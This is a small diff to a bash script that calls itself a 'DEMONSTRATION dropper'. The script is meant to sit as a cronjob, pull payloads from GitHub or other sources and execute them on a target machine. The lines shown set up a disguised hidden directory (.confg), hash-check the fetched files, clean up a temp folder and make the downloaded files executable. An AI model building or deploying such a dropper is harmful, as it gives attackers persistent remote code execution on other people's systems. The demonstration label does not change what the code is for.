@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# See README.md
+# This is a DEMONSTRATION dropper, that will be embedded as a cronjob to pull payloads from Github (or other sources), to be executed on the target machine.
+
 user="$(whoami)"
 hash_check() {
 	sha256sum /home/$user/.confg/* | awk '{print $1}'
@@ -29,4 +32,3 @@ else
 	rm -rf /home/$user/.confg_tmp
 	chmod +x /home/$user/.confg/*
 fi
-
